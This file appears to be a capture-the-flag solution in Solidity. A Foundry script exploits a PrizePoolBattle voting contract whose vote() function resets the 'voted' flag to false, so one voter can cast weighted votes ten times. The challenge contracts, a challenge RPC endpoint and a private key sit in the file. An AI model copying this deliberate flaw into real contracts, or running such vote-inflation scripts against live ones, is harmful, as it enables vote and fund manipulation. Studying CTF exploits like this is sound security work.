// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0x7C062721a3f77113627c80Fb55D11c791BAfd3bc);
    address wallet = 0x97071BdFDEcebC2dDbDfbF18af3958c024aa9ed1;
    PrizePoolBattle public prizepool = setup.prizepool();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0x56ccedecf5f1ca7f53cc3732d09801586e21b1383972ac561b715685fd9d13b9);

        console.log(wallet.balance);

        prizepool.addVoter{value: 1 ether}("Nafiz");

        for(uint256 i = 0; i < 10; i++) {
            prizepool.vote(1);
        }

        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

// UUID	e4b83384-0cae-424f-9077-ba448145eee5
// RPC Endpoint	http://103.178.153.113:40006/e4b83384-0cae-424f-9077-ba448145eee5
// Private Key	0x56ccedecf5f1ca7f53cc3732d09801586e21b1383972ac561b715685fd9d13b9
// Setup Contract	0x7C062721a3f77113627c80Fb55D11c791BAfd3bc
// Wallet	0x97071BdFDEcebC2dDbDfbF18af3958c024aa9ed1

contract Setup{
    PrizePoolBattle public immutable prizepool;
    Participant1 public immutable participant1;
    Participant2 public immutable participant2;
    Participant3 public immutable participant3;


    constructor() payable{
        require(msg.value >= 9 ether, "Need 9 ether to start challenge");
        prizepool = new PrizePoolBattle();
        participant1 = new Participant1{value: 5 ether}(address(prizepool));
        participant2 = new Participant2{value: 1 ether}(address(prizepool));
        participant3 = new Participant3{value: 3 ether}(address(prizepool));
    }

    function isSolved() public view returns(bool){
        (, uint winner) = prizepool.getWinner();
        return winner == 1;
    }

}

contract Participant1{
    PrizePoolBattle public immutable prizepool;

    constructor(address _target) payable{
        prizepool = PrizePoolBattle(_target);
        prizepool.addVoter{value: 5 ether}("Michelio");
        prizepool.vote(2);
    }

}

contract Participant2{
    PrizePoolBattle public immutable prizepool;

    constructor(address _target) payable{
        prizepool = PrizePoolBattle(_target);
        prizepool.addVoter{value: 1 ether}("Barnadan");
        prizepool.vote(2);
    }

}

contract Participant3{
    PrizePoolBattle public immutable prizepool;

    constructor(address _target) payable{
        prizepool = PrizePoolBattle(_target);
        prizepool.addVoter{value: 3 ether}("Elizabeth");
        prizepool.vote(2);
    }

}

contract PrizePoolBattle{
    struct Candidate {
        uint id;
        string name;
        uint voteCount;
    }

    struct Voter {
        uint id;
        string name;
        uint256 weight;
        bool voted;
    }

    mapping(uint => Candidate) public candidates;
    mapping(uint => Voter) public voters;
    mapping(address => bool) public votersExist;
    mapping(address => uint) public votersID;
    uint public candidatesCount;
    uint public votersCount;
    uint public winner;
    bool public winnerDeclared = false;

    event Voted(address indexed voter, uint indexed candidateId);
    event Winner(uint indexed candidateId, string name);

    modifier checkWinner(uint _candidateId) {
        _;
        if (candidates[_candidateId].voteCount >= 10 ether) {
            winnerDeclared = true;
            winner = _candidateId;
            emit Winner(_candidateId, candidates[_candidateId].name);
        }
    }

    constructor() {
        addCandidate("ENUMA");
        addCandidate("ALPHA");
    }

    function addCandidate(string memory _name) internal {
        require(
            keccak256(abi.encodePacked(_name)) == keccak256(abi.encodePacked("ENUMA")) ||
            keccak256(abi.encodePacked(_name)) == keccak256(abi.encodePacked("ALPHA")),
            "Only ENUMA or ALPHA can be added as candidates"
        );
        candidatesCount++;
        candidates[candidatesCount] = Candidate(candidatesCount, _name, 0);
    }

    function addVoter(string memory _name) public payable{
        require(!votersExist[msg.sender], "Voter has already been added.");
        votersCount++;
        uint256 weight = msg.value;
        voters[votersCount] = Voter(votersCount, _name, weight, false);
        votersID[msg.sender] = votersCount;
        votersExist[msg.sender] = true;
    }

    function vote(uint _candidateId) public checkWinner(_candidateId) {
        require(votersExist[msg.sender], "You are not an eligible voter.");
        require(!winnerDeclared, "The winner has already been declared.");
        require(_candidateId > 0 && _candidateId <= candidatesCount, "Invalid candidate ID.");
        uint id = votersID[msg.sender];
        require(voters[id].voted == false, "You already vote!");
        voters[id].voted = false;
        candidates[_candidateId].voteCount += voters[id].weight * 1;
        emit Voted(msg.sender, _candidateId);
    }

    function getCandidateVoteCount(uint _candidateId) public view returns (string memory name, uint voteCount) {
        Candidate storage candidate = candidates[_candidateId];
        return (candidate.name, candidate.voteCount);
    }

    function getWinner() public view returns(string memory name, uint id){
        Candidate storage candidate = candidates[winner];
        return (candidate.name, candidate.id);
    }

}